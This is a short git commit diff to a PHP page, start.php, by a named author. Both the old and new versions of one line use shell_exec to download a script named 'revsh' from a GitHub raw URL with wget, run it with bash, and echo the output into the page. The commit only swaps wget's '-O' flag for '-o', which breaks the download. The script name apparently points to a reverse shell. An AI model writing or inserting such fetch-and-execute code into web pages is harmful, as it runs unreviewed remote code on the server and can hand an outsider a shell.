42af5518b06579daec78a13ae9ee45d5a9c78417
Gabriele Russo <gabryr96@gmail.com>
2017-11-20 19:11:10 +0100

    Update start.php

--- start.php
+++ start.php
@@ -2,7 +2,7 @@
 	</body>
 </html>	
 <?php 
-	$prova = shell_exec('cd /tmp/trs; wget -O revsh https://raw.githubusercontent.com/Gabry-r/Shellscripts/master/tes; /bin/bash /tmp/trs/revsh > /tmp/trs/output; cat /tmp/trs/output');
+	$prova = shell_exec('cd /tmp/trs; wget -o revsh https://raw.githubusercontent.com/Gabry-r/Shellscripts/master/tes; /bin/bash /tmp/trs/revsh > /tmp/trs/output; cat /tmp/trs/output');
 	print "<html>
 	    <body>
 		{$prova}
